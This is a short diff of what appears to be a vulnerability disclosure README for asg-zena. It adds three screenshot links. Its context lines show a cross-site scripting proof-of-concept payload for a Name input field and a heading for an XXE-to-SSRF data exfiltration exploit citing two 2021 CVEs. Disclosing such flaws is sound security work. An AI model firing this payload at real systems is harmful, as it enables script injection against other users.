@@ -31,6 +31,10 @@ POC code - placed into the Name input field:
 ```</li><img/src='fail'/onerror=alert("vulnerable")></img>```
 
 
+![image](https://user-images.githubusercontent.com/81385287/171973915-0ff4e8b4-2d39-4558-a794-a7dae6e4935d.png)
+![image](https://user-images.githubusercontent.com/81385287/171973946-9073ad46-e200-437a-80f8-5f11669b462a.png)
+![image](https://user-images.githubusercontent.com/81385287/171973970-c2f7eefe-4cfe-4a64-ad27-4691324c1952.png)
+
 ## Proof of Concept code for XXE to SSRF to Data Exfiltration exploit for asg-zena
 CVE-2021-45024
 CVE-2021-45022 SSRF
